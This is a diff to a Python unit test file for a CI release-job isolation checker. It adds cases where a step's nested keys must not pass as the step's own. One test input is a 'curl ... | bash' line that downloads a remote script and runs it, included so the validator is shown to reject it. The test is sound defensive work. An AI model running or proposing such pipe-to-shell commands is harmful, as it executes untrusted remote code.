@@ -163,18 +163,30 @@ class ReleaseJobIsolationTest(unittest.TestCase):
             "      - uses: some-org/some-action@v1\n",
             "      - name: Resolve released tag\n        uses: some-org/some-action@v1\n",
         ):
+            extra = append_to_release(step)
             with self.subTest(step=step):
                 with self.assertRaisesRegex(ValueError, "must not use 'some-org/some-action'"):
-                    check.validate_release_job_isolation(append_to_release(step))
+                    check.validate_release_job_isolation(extra)
 
     def test_unexpected_step_in_deploy_key_job_fails(self) -> None:
         for step, label in (
             ("      - run: curl -sSf https://example.invalid/x.sh | bash\n", "'run: curl"),
             ("      - name: Fetch helper\n        run: ./helper.sh\n", "'Fetch helper'"),
         ):
+            extra = append_to_release(step)
             with self.subTest(step=step):
                 with self.assertRaisesRegex(ValueError, f"unexpected step {label}"):
-                    check.validate_release_job_isolation(append_to_release(step))
+                    check.validate_release_job_isolation(extra)
+
+    def test_nested_key_does_not_pass_for_the_step_s_own(self) -> None:
+        for step in (
+            "      - run: ./helper.sh\n        env:\n          name: Resolve released tag\n",
+            "      - run: |\n          uses: actions/checkout\n          ./helper.sh\n",
+        ):
+            extra = append_to_release(step)
+            with self.subTest(step=step):
+                with self.assertRaisesRegex(ValueError, "unexpected step 'run:"):
+                    check.validate_release_job_isolation(extra)
 
     def test_release_checkout_must_fetch_full_history(self) -> None:
         shallow = with_job("release", lambda block: block.replace("          fetch-depth: 0\n", ""))
@@ -210,9 +222,10 @@ class ReleaseJobIsolationTest(unittest.TestCase):
             ),
         }
         for case, edit in cases.items():
+            edited = with_job("preflight", edit)
             with self.subTest(case=case):
                 with self.assertRaisesRegex(ValueError, "preflight job (missing 'contents: read'|must not have any write)"):
-                    check.validate_release_job_isolation(with_job("preflight", edit))
+                    check.validate_release_job_isolation(edited)
         extra = with_job("preflight", cases["extra write scope"])
         with self.assertRaisesRegex(ValueError, "must not have any write permission"):
             check.validate_release_job_isolation(extra)
